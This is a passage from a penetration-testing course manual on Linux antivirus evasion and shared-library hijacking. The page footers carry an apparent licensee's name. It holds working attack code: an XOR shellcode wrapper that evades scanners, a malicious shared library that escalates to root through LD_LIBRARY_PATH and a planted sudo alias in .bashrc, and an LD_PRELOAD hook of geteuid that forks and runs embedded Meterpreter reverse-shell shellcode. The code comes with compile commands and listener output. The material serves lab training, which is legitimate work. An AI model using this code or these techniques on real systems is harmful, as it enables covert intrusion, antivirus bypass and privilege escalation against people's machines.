[*] Meterpreter session 11 opened (192.168.118.3:1337 -> 192.168.120.45:43588) 
 
meterpreter > getuid 
Server username: no-user @ linuxvictim (uid=1000, gid=1000, euid=1000, egid=1000) 
Listing 476 - Received a shell via our XOR wrapper program 
Now that we know that the shell works properly, let’s try scanning it with Antiscan.me. We’ll 
repeat the process of renaming the file to have a .exe extension, downloading it to our Kali VM, 
and uploading to Antiscan as before. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
394 
 
Figure 170: Our XOR wrapper passed all scanners 
The results show that our changes were sufficient to bypass all 26 scanners. 
The fact that our XOR-based shellcode wrapper program bypassed all of the scanners shows the 
minimal effort required to evade at least some Linux antivirus programs. 
In the next section, we’ll discuss shared libraries in Linux and how we can abuse them on security 
assessments. 
10.2.2.1 Exercises 
1. 
Bypass Kaspersky by running a shell in a C wrapper program as shown in this section. 
2. 
Bypass the other scanners in Antiscan.me using XOR obfuscation as shown in this section. 
10.2.2.2 Extra Mile 
Modify the example we covered in this section to use a different encoding method such as using 
a Caesar Cipher. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
395 
10.3 Shared Libraries 
In this section we’ll examine how shared libraries being loaded by applications on a Linux system 
can be manipulated to provide an advantage to an attacker. This approach is similar to DLL 
hijacking,587 which is commonly used to compromise Windows systems. 
We’ll take a look at how shared libraries work as well as several approaches for exploiting them, 
including the use of specific environment variables and abusing loading path order. Let’s start by 
learning how shared libraries work at a basic level. 
10.3.1 
How Shared Libraries Work on Linux 
Perhaps not surprisingly, programs on Linux are structured in a different format than what is used 
on Windows systems. The most commonly used program format in Linux is Executable and 
Linkable Format (ELF).588 On Windows, it is the Portable Executable (PE)589 format. A deep 
explanation of these formats is not in scope for this course. For now, it’s enough to know that 
program formats differ between Linux and Windows systems. 
Programs on these two systems do have some things in common. In particular, they are similar in 
how they share code with other applications. On Windows, this shared code is most commonly 
stored in Dynamic-Link Library (DLL)590 files. Linux, on the other hand, uses Shared Libraries.591 
These libraries allow code to be defined separately from specific applications and reused, which 
means the libraries can be shared between different applications on the system. 
This is a benefit in terms of storage space and reducing locations in code where errors might 
occur. It also provides a single place to update code and affect multiple programs. For this reason 
in particular, it represents a valuable attack vector. A change to a shared library can affect all 
programs that use it. 
When an application runs on Linux, it checks for its required libraries in a number of locations in a 
specific order. When it finds a copy of the library it needs, it stops searching and loads the module 
it finds. The application searches for libraries in these locations, following this ordering.592 
1. 
Directories listed in the application’s RPATH593 value. 
2. 
Directories specified in the LD_LIBRARY_PATH environment variable. 
3. 
Directories listed in the application’s RUNPATH594 value. 
4. 
Directories specified in /etc/ld.so.conf.595 
 
587 (The MITRE Corporation, 2020), https://attack.mitre.org/techniques/T1574/001/ 
588 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Executable_and_Linkable_Format 
589 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Portable_Executable 
590 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Dynamic-link_library 
591 (David A. Wheeler, 2013), https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html 
592 (Amir Rachum, 2016), https://amir.rachum.com/blog/2016/09/17/shared-libraries/#runtime-search-path 
593 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Rpath 
594 (Amir Rachum, 2016), https://amir.rachum.com/blog/2016/09/17/shared-libraries/#rpath-and-runpath 
595 (Man7.org, 2020), https://man7.org/linux/man-pages/man8/ldconfig.8.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
396 
5. 
System library directories: /lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64, and 
potentially others. 
Because the locations and the order is known, we can potentially hijack or place our own versions 
of shared libraries in places earlier in the chain in order to control the application’s behavior. 
First, let’s inspect the LD_LIBRARY_PATH variable and how we can use it to direct a program to 
use a malicious version of a library instead of the one originally intended for the program. 
10.3.2 
Shared Library Hijacking via LD_LIBRARY_PATH 
As we mentioned previously, when an application runs, it checks for its libraries in an ordered set 
of locations. After checking its internal RPATH values for hard coded paths, it then checks for an 
environment variable called LD_LIBRARY_PATH. Setting this variable allows a user to override the 
default behavior of a program and insert their own versions of libraries. 
Intended use cases for this include testing new library versions without modifying existing 
libraries or modifying the program’s behavior temporarily for debugging purposes. As an attacker, 
we can also use it to maliciously change the intended behavior of the program. We’ll exploit a 
victim user’s application by creating a malicious library and then use LD_LIBRARY_PATH to hijack 
the application’s normal flow and execute our malicious code to escalate privileges. 
Note that for demonstration, we are explicitly setting the environment variable before each call. 
However, as an attacker, we would want to insert a line in the user’s .bashrc or .bash_profile to 
define the LD_LIBRARY_PATH variable so it is set automatically when the user logs in. 
One difficulty with using LD_LIBRARY_PATH for exploitation is that on most modern systems, 
user environment variables are not passed on when using sudo. This setting is configured in the 
/etc/sudoers file by using the env_reset keyword as a default. Some systems are configured to 
allow a user’s environment to be passed on to sudo. These will have env_keep set instead. 
We could bypass the env_reset setting with our previously-mentioned .bashrc alias for the sudo 
command. We mentioned this approach earlier when we set the sudo command to sudo -E in 
Listing 444. As a normal user, it’s not typically possible to read /etc/sudoers to know if env_reset 
is set, so it may be useful to create this alias setting regardless. 
We’ll need to tweak this process to make LD_LIBRARY_PATH work with sudo. We’ll discuss how 
to do this later in this section. 
Let’s walk through an example of a simple malicious, shared library using the C programming 
language596 and save it as /home/offsec/ldlib/hax.c. 
The full code listing is below, but we’ll discuss the parts in the following paragraphs. 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> // for setuid/setgid 
 
static void runmahpayload() __attribute__((constructor)); 
 
 
596 (Wikipedia, 2020), https://en.wikipedia.org/wiki/C_(programming_language) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
397 
void runmahpayload() { 
    setuid(0); 
    setgid(0); 
    printf("DLL HIJACKING IN PROGRESS \n"); 
    system("touch /tmp/haxso.txt"); 
} 
Listing 477 - A basic example of a shared library payload 
The first three lines include header files as discussed in earlier examples. 
The fourth line provides a function declaration for a constructor function called runmahpayload. 
Constructor597, 598 functions are run when the library is first initialized in order to set up code for 
the library to use. 
static void runmahpayload() __attribute__((constructor)); 
Listing 478 - The constructor function definition 
By doing this, we’re just letting the compiler know that a function of this name will be defined 
later. 
We are creating a constructor function so that our malicious code will run when our library is 
loaded, regardless of what the original program is trying to do with it. In other words, the original 
program will try to load the library, which will then run our constructor function, triggering our 
malicious payload. 
The remainder of the lines contain the function’s actual code itself. This is where we’ll put our 
malicious actions. 
void runmahpayload() { 
    setuid(0); 
    setgid(0); 
    printf("DLL HIJACKING IN PROGRESS \n"); 
    system("touch /tmp/haxso.txt"); 
} 
Listing 479 - Our temporary payload 
In our case, we initially set the user’s UID and GID to “0”, which will make the user root if run in a 
sudo context. We’ll then print a message to the screen to show that it functioned correctly and 
modify a file in /tmp to show an action on the file system. 
We’ll compile our shared library using two commands. 
offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o hax.o hax.c 
Listing 480 - Compiling our shared library object file 
In the first command, we use the -Wall parameter, which gives more verbose warnings when 
compiling. The -fPIC option tells the compiler to use position independent code,599 which is 
suitable for shared libraries since they are loaded in unpredictable memory locations. The -c flag 
tells gcc to compile but not link the code and -o tells the compiler to produce an output file with 
 
597 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Constructor_(object-oriented_programming) 
598 (David A. Wheeler, 2013), https://tldp.org/HOWTO/Program-Library-HOWTO/miscellaneous.html 
599 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Position-independent_code 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
398 
the name immediately following the parameter. Finally, the last item is the source code file we’ve 
written. 
In the second command, we’re again using gcc to compile. However, this time we use the -
shared parameter to tell gcc we’re creating a shared library from our object file. We then specify 
an output file again, this time with the name libhax.so, and then we specify our input object file. 
offsec@linuxvictim:~/ldlib$ gcc -shared -o libhax.so hax.o 
Listing 481 - Compiling our finished shared library file 
This produces a libhax.so shared library file. 
One important thing to note is that shared libraries in Linux use the soname600 naming 
convention. This is typically something like lib.so, which may also include a version number 
appended to the end with a period or full-stop character. For example, we might see lib.so.1. 
Naming our libraries following this convention will help us with the linking process. 
Now that we have a malicious shared library, we need a place to use it. We want to hijack the 
library of a program that a victim is likely to run, especially as sudo. We also need to remember 
that whichever library we’re hijacking will be unavailable to the requesting program. As such, we 
want to find something that won’t break the system if all programs are prevented from using it. 
Let’s try targeting the top command, which is used to display processes in real time on a Linux 
system. It’s likely that a user might run this as sudo in order to display processes with elevated 
permissions, so it’s a good candidate. 
We’ll run the ldd601 command in the target machine on the top program. This will give us 
information on which libraries are being loaded when top is being run. 
offsec@linuxvictim:~$ ldd /usr/bin/top 
    linux-vdso.so.1 (0x00007ffd135c5000) 
    libprocps.so.6 => /lib/x86_64-linux-gnu/libprocps.so.6 (0x00007ff5ab935000) 
    libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007ff5ab70b000) 
    libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff5ab507000) 
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff5ab116000) 
    libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007ff5aae92000) 
    /lib64/ld-linux-x86-64.so.2 (0x00007ff5abd9b000) 
    librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 (0x00007ff5aac8a000) 
    liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007ff5aaa64000) 
    liblz4.so.1 => /usr/lib/x86_64-linux-gnu/liblz4.so.1 (0x00007ff5aa848000) 
    libgcrypt.so.20 => /lib/x86_64-linux-gnu/libgcrypt.so.20 (0x00007ff5aa52c000) 
    libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ff5aa30d000) 
    libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000) 
Listing 482 - Determining libraries run by the “top” utility 
The last library listed appears to be a library for error reporting called LibGPG-Error.602 This is likely 
to be loaded by the application but not likely to be called unless the program encounters an error, 
 
600 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Soname 
601 (Man7.org, 2020), https://man7.org/linux/man-pages/man1/ldd.1.html 
602 (GnuPG Project, 2017), h<ttps://www.gnupg.org/software/libgpg-error/index.html> 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
399 
therefore this shouldn’t prevent normal use of the application. Let’s try to hijack that and find out 
what happens. 
Note that it may require some trial and error to find a library that behaves favorably to run our 
code and not have adverse side effects on the system. Ideally, we want to target a library that 
also allows the program to run correctly even after our exploit is run, but this may not always be 
possible. 
We set our environment variable for LD_LIBRARY_PATH and rename our .so file to match the one 
we’re hijacking. 
offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/ 
 
offsec@linuxvictim:~/ldlib$ cp libhax.so libgpg-error.so.0 
Listing 483 - Preparing the environment and shared library for exploitation 
If we want to later turn off the malicious library functionality, we need to unset 
the environment variable using the unset command. Our approach here does not 
modify the original shared library at all, so when the environment variable is 
unset, the original functionality is restored. 
Now we can run our top program and examine what happens. 
offsec@linuxvictim:~/ldlib$ top 
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required 
by /lib/x86_64-linux-gnu/libgcrypt.so.20) 
top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock 
version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference 
Listing 484 - Our exploit fails miserably 
Unfortunately, we have a problem. The error message states that we’re missing the symbol 
gpgrt_lock_lock with a version of GPG_ERROR_1.0. The program has not yet run our library’s 
constructor, but it’s already giving an error that we’re missing symbols.603 
This means that certain variables or functions that the program expects to find when loading the 
original library have not been defined in our malicious library. As a result, the program won’t even 
attempt to run our library’s constructor. Fortunately, this is fairly easy to fix. 
When loading a library, a program only wants to know that our library contains symbols of that 
name. It doesn’t care anything about validating their type or use. Because of that, we can simply 
define some variables with the same names that it expects and top should run. 
We have an additional advantage in that the original shared library exists on the file system. Let’s 
examine it and determine what symbols it contains using the readelf604 utility. The -s parameter 
will give a list of available symbols in the library. 
 
603 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Symbol_(programming) 
604 (Die.net, 2009), https://linux.die.net/man/1/readelf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
400 
Not all of the listed symbols are needed since some of them refer to other libraries. The error 
message specifies that the symbol it’s looking for is tagged with GPG_ERROR_1.0. We can infer 
that it’s part of the library we’re replacing (libgpg-error.so.0). 
The readelf output for the original shared library will display many defined symbols. However, with 
the use of some bash command-line utilities, we can parse out the information we need 
specifically and put it into a format that we can paste directly into our library source code file to 
define variables. 
To do this, we’ll again call the readelf command with the -s flag. We’ll also include the --wide 
flag to force it to include the untruncated names of the symbols, as well as the full path to the 
original shared library file. We’ll pipe that output to grep and search for lines containing “FUNC” 
representing symbols we need to capture. We’ll then pipe this to grep again and filter out only the 
results that also contain “GPG_ERROR”, indicating they are stored in our library and not in an 
unrelated dependency. 
Once we’ve done that, we pipe the resulting lines to awk to capture only a specific column of the 
lines returned, while prepending “int” to it. This will help us more easily define variables in our code 
to represent the symbols we are missing. Finally, we pipe that output to sed to replace the version 
information with a semicolon in order to finalize the variable definitions. 
offsec@linuxvictim:~/ldlib$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 
| grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g' 
int gpgrt_onclose; 
int _gpgrt_putc_overflow; 
int gpgrt_feof_unlocked; 
... 
int gpgrt_fflush; 
int gpgrt_poll; 
Listing 485 - The output gets the symbols associated with our hijacked library and makes C variables for them as output 
The result is a list of variable definitions, one for each missing symbol, that we can copy and 
paste just under our initial constructor definition in our hax.c source code file. 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> // for setuid/setgid 
 
static void runmahpayload() __attribute__((constructor)); 
 
int gpgrt_onclose; 
int _gpgrt_putc_overflow; 
int gpgrt_feof_unlocked; 
... 
Listing 486 - The new symbols in our source code 
After recompiling and setting the LD_LIBRARY_PATH variable again, this time when we run top, 
we get the result we wanted. 
offsec@linuxvictim:~/ldlib$ top 
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required 
by /lib/x86_64-linux-gnu/libgcrypt.so.20) 
DLL HIJACKING IN PROGRESS  
... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
401 
Listing 487 - Our hijacking worked properly 
Unfortunately, we notice an obvious error message about the shared library’s version information. 
Not all supporting libraries require version information, so this does not always occur. If we were 
to hijack a different library, we may not receive this error. In this case, however, it seems that 
libgcrypt does require version information in associated libraries. Thankfully, we can fix this with 
the help of a map605 file that identifies particular symbols as being associated with a given version 
of the library. 
First, we’ll run a modified version of our previous readelf command, this time omitting “int” 
before the symbol names. 
offsec@linuxvictim:~/ldlib$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 
| grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g' 
gpgrt_onclose; 
_gpgrt_putc_overflow; 
gpgrt_feof_unlocked; 
gpgrt_vbsprintf; 
... 
Listing 488 - Getting symbol names 
This simply provides a list of symbols that we can then “wrap” into a symbol map file for the 
compiler to use. We’ll call this file gpg.map. 
GPG_ERROR_1.0 { 
gpgrt_onclose; 
_gpgrt_putc_overflow; 
... 
gpgrt_fflush; 
gpgrt_poll; 
 
}; 
Listing 489 - Symbol map file 
The version number for these symbols doesn’t have any direct impact on our exploit, but it fulfills 
the version requirement that is causing our earlier error message. 
Once the file is created, we can compile our shared library again and include the symbol file with -
-version-script. 
offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o hax.o hax.c 
 
offsec@linuxvictim:~/ldlib$ gcc -shared -Wl,--version-script gpg.map -o libgpg-
error.so.0 hax.o 
Listing 490 - Recompiling the shared library with a symbol map 
We set our LD_LIBRARY_PATH environment variable as we did before and run the application 
again. 
offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/ 
 
 
605 (Free Software Foundation, Inc. , 2020), https://www.gnu.org/software/gnulib/manual/html_node/LD-Version-Scripts.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
402 
offsec@linuxvictim:~/ldlib$ top 
DLL HIJACKING IN PROGRESS  
top - 14:55:15 up 9 days,  4:35,  2 users,  load average: 0.01, 0.01, 0.00 
Tasks: 164 total,   1 running,  92 sleeping,   0 stopped,   0 zombie 
... 
Listing 491 - Working correctly 
This time, we do not receive an error message. 
We can look for the file our library was supposed to modify in /tmp. 
offsec@linuxvictim:~/ldlib$ ls -al /tmp/haxso.txt  
-rw-rw-r-- 1 offsec offsec 0 Jul 10 17:12 /tmp/haxso.txt 
Listing 492 - Evidence of our code working properly 
The results show the file was created. 
In this case, we were somewhat lucky in that our application ran properly without the libgpg_error 
library. If an error occurred that required libgpg_error, the application would likely crash. 
Earlier, we discussed how in modern Linux distributions a user’s environment variables aren’t 
normally passed to a sudo context. To get around this, we created an alias for sudo in the user’s 
.bashrc file replacing sudo with sudo -E. However, some environment variables are not passed 
even with this approach. Unfortunately, LD_LIBRARY_PATH is one of these. If we try to run top 
with sudo, our module is not run. 
There is a workaround. We can modify the alias we created for this purpose to include our 
LD_LIBRARY_PATH variable explicitly. This forces it to be passed to the sudo environment. 
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib" 
Listing 493 - Modified alias to include LD_LIBRARY_PATH 
If we source the .bashrc file to load the changes we made, when we run the command with sudo, 
the command executes as root. 
offsec@linuxvictim:~/ldlib$ source ~/.bashrc 
 
offsec@linuxvictim:~/ldlib$ sudo top 
DLL HIJACKING IN PROGRESS  
top - 14:51:20 up 6 days,  6:03,  5 users,  load average: 0.00, 0.00, 0.00 
... 
 
offsec@linuxvictim:~/ldlib$ ls -al /tmp/haxso.txt  
-rw-r--r-- 1 root root 0 Aug 11 14:51 /tmp/haxso.txt 
Listing 494 - Modified alias to run our library as sudo 
We successfully exploited an application using LD_LIBRARY_PATH and a malicious shared library 
file. 
In the next section, we’ll use LD_PRELOAD to hijack library functions. 
10.3.2.1 Exercises 
1. 
Create a malicious shared library example as shown in this section and run it using 
LD_LIBRARY_PATH and the top utility. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
403 
2. 
Create a .bashrc alias for sudo to include LD_LIBRARY_PATH and use the malicious library 
example we created to escalate to root privileges. 
10.3.2.2 Extra Mile 
1. 
Get a shell by adding shellcode execution to our shared library example. Consider using the 
AV bypass code we covered previously as a guide. Continuing the program’s functionality 
after the shell is fired is not necessary in this case. 
2. 
Hijack an application other than top using the method described in this section. 
10.3.3 
Exploitation via LD_PRELOAD 
LD_PRELOAD606 is an environment variable which, when defined on the system, forces the 
dynamic linking loader607 to preload a particular shared library before any others. As a result, 
functions that are defined in this library are used before any with the same method signature608 
that are defined in other libraries. 
A method signature is the information that a program needs to define a method. 
It consists of the value type the method will return, the method name, a listing of 
the parameters it needs, and each of their data types. 
LD_PRELOAD faces a similar limitation as the LD_LIBRARY_PATH exploit vector we covered 
previously. Sudo will explicitly ignore the LD_PRELOAD environment variable for a user unless the 
user’s real UID is the same as their effective UID. This is important, as it will hinder the privilege 
escalation approach described earlier in this module. There are potential bypasses as we’ll 
explain later. 
As mentioned, libraries specified by LD_PRELOAD are loaded before any others the program will 
use. This means that methods we define in a library loaded by LD_PRELOAD will override methods 
loaded later on. Overriding methods in this way is a technique known as function hooking.609 
Because the original libraries are also still being loaded, we can call the original functions and 
allow the program to continue working as intended. This makes our activity much less obvious 
and is less likely to tip off a savvy administrator. 
In this module we’ll leverage this technique to load our own malicious shared library. We’ll also 
load the original libraries, meaning the program will run as intended, which will help us keep a low 
profile. 
For this attack vector, we first need to find an application that the victim is likely to frequently use. 
One potential option is the cp610 utility, which is used to copy files between locations on the 
system. This utility is often used with sudo which could improve our attack’s effectiveness. 
 
606 (Man7.org, 2020), https://man7.org/linux/man-pages/man8/ld.so.8.html 
607 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Dynamic_linker 
608 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Type_signature#Method_signature 
609 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Hooking 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
404 
We can run ltrace611 on the cp command to get a list of library function calls it uses during normal 
operation. 
offsec@linuxvictim:~$ ltrace cp 
strrchr("cp", '/')                                                              = nil 
... 
geteuid()                                                                       = 1000 
getenv("POSIXLY_CORRECT")                                                       = nil 
... 
fflush(0x7f717f0c0680)                                                          = 0 
fclose(0x7f717f0c0680)                                                          = 0 
+++ exited (status 1) +++ 
Listing 495 - Running ltrace on the “man” utility 
ltrace is not installed by default on all Linux distributions but is fairly common to 
find. It can also be installed through the standard package repositories. In our 
case, ltrace is installed on the linuxvictim lab machine. In a real-world scenario, it 
is ideal to run this on the target machine if possible to ensure that the library calls 
correctly match the target’s system and program configuration. 
There are a lot of calls, but one that stands out is geteuid.612 This function is a good candidate 
because it seems to only be called once during the application run, which limits how frequently 
our code will be executed. Using this function will limit redundant shells. 
According to the function’s man page,613 it takes no parameters and returns the user’s UID 
number. 
Let’s try to hook this call through our own malicious shared library. In our library, we’ll simply 
redefine the geteuid function. We don’t need to define a constructor function as we did in the 
previous examples. This is because we want to fire our payload when a library function is being 
called, rather than when the library is loaded. Also, this will allow us to “patch” what the library is 
doing and still retain its original behavior. 
This time, we’ll include a reverse shell so we can enjoy the full benefit of our efforts. 
Let’s walk through our code. First, as with other C programs, the include statements list the 
standard libraries the program will use. dlfcn.h,614 is worth noting as it defines functions for 
interacting with the dynamic linking loader. 
#define _GNU_SOURCE 
#include <sys/mman.h> // for mprotect 
#include <stdlib.h> 
#include <stdio.h> 
 
610 (Man7.org, 2020), https://man7.org/linux/man-pages/man1/cp.1.html 
611 (Die.net, 2020), https://linux.die.net/man/1/ltrace 
612 (Die.net, 2020), https://linux.die.net/man/2/geteuid 
613 (Die.net, 2020), https://linux.die.net/man/2/geteuid 
614 (Die.net, 2020), https://linux.die.net/man/3/dlopen 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
405 
#include <dlfcn.h> 
#include <unistd.h> 
Listing 496 - Include statements 
The next portion of our code is our shellcode, which is stored in the buf character array. We can 
generate a payload with msfvenom in C format. 
char buf[] =  
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9" 
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a" 
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05" 
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8" 
"\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59" 
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a" 
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48" 
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e" 
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6"; 
Listing 497 - Meterpreter reverse shellcode 
Following the shellcode declaration, we’ll define our geteuid function. The signature matches the 
original. It has no parameters (void) and returns a value of uid_t, which in this case is simply an 
integer. 
uid_t geteuid(void) 
{ 
Listing 498 - Defining the function 
The next line defines a pointer, which we’ll use to point to the old geteuid function. We’re using the 
typeof615 keyword to determine the pointer type dynamically. As a reminder from the AV section, a 
pointer is just a variable that points to a place in memory. In this case, it points to the memory 
location where the old geteuid function is stored. 
        typeof(geteuid) *old_geteuid; 
Listing 499 - Defining the pointer to the old geteuid function 
This provides us access to the original function so that we can call it later on. This will allow us to 
retain the original functionality of the program. 
Next, we use the dlsym616 function to get the memory address of the original version of the 
geteuid function. The dlsym function finds a symbol for a dynamic library in memory. When 
calling it, we give it the name of the symbol we’re trying to find (in this case “geteuid”). This will 
return the next occurrence of “geteuid” in memory outside of the current library. Calling this will 
skip our version of the function and find the next one, which should be the original version loaded 
by the program the user called. 
        old_geteuid = dlsym(RTLD_NEXT, "geteuid"); 
Listing 500 - Defining the pointer to the old geteuid function 
At this point, it’s important to point out that if we keep our original shared library code format, we 
are going to run into a problem. If we use it as-is, when we run our target application, it will stop 
 
615 (Free Software Foundation, Inc. , 2020), https://gcc.gnu.org/onlinedocs/gcc/Typeof.html 
616 (Die.net, 2020), https://linux.die.net/man/3/dlsym 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
406 
and wait for our shell to return before continuing. This means that the function will stall and the 
cp program will stall as well. This will certainly raise suspicion. 
Ideally, we want the program to return right away, but still run our shell in the background. In order 
to do this, we need to create a new process for our shell. We can do this using the fork617 method, 
which creates a new process by duplicating the parent process. This line in the code determines 
whether or not the result of the fork call is zero. If it is, we are running inside the newly created 
child process, and can run our shell as we did with our earlier AV bypass shell application. 
Otherwise, it will return the expected value of geteuid to the original calling program so it can 
continue as intended. The final two lines provide a meaningless return value in case the code 
reaches that point, which realistically should never happen. 
       if (fork() == 0) 
        { 
                intptr_t pagesize = sysconf(_SC_PAGESIZE); 
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), 
                 pagesize, PROT_READ|PROT_EXEC)) { 
                        perror("mprotect"); 
                        return -1; 
                } 
                int (*ret)() = (int(*)())buf; 
                ret(); 
        } 
        else 
        { 
                printf("HACK: returning from function...\n"); 
                return (*old_geteuid)(); 
        } 
        printf("HACK: Returning from main...\n"); 
        return -2; 
} 
 
Listing 501 - Forking the process to get a shell 
The code within the fork branch checks that the shellcode resides on an executable memory page 
before executing it. The reason for this additional step is that the -f PIC compilation flag 
relocates our shellcode to the library .data section in order to make it position independent. 
Specifically, the code gets the size of a memory page so it knows how much memory to access. 
It then changes the page of memory that contains our shellcode and makes it executable using 
mprotect. It does this by setting its access properties to PROT_READ and PROT_EXEC, which 
makes our code readable and executable. If changing the memory permissions fails, the program 
will exit with a return code of “-1”. 
We’ll save our code as evileuid.c and compile and link it as we did in our previous examples. 
offsec@linuxvictim:~$ gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c 
 
offsec@linuxvictim:~$ gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl 
Listing 502 - Compiling our library 
 
617 (Man7.org, 2020), https://man7.org/linux/man-pages/man2/fork.2.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
407 
Now that our library is compiled, let’s do a test. After setting up a Meterpreter listener for our 
shellcode, we’ll run cp once without our library and then once with the LD_PRELOAD environment 
variable set, hooking the function call. 
offsec@linuxvictim:~$ cp /etc/passwd /tmp/testpasswd 
 
offsec@linuxvictim:~$ export LD_PRELOAD=/home/offsec/evil_geteuid.so 
 
offsec@linuxvictim:~$ cp /etc/passwd /tmp/testpasswd 
HACK: returning from function... 
Listing 503 - Executing our payload 
It worked! We find in our Metasploit listener that our shell successfully connected. 
msf5 exploit(multi/handler) > run 
 
[*] Started reverse TCP handler on 192.168.119.120:1337  
[*] Sending stage (3012516 bytes) to 192.168.120.46 
[*] Meterpreter session 8 opened (192.168.119.120:1337 -> 192.168.120.46:58114) at 
2020-07-28 16:58:40 -0400 
 
meterpreter > getuid 
Server username: no-user @ linuxvictim (uid=1000, gid=1000, euid=1000, egid=1000) 
Listing 504 - Received a shell 
This is a great step, but we’re still executing as the offsec user. We haven’t elevated our privileges. 
Let’s try that next. 
Before continuing, we’ll unset LD_PRELOAD which could have adverse effects on other system 
actions we’ll perform. 
offsec@linuxvictim:~$ unset LD_PRELOAD 
Listing 505 - Clearing LD_PRELOAD 
Now that we’ve got it working, let’s talk about privilege escalation with this method. 
As we mentioned previously, the dynamic linker ignores LD_PRELOAD when the user’s effective 
UID (EUID) does not match its real UID, for example when running commands as sudo. We might 
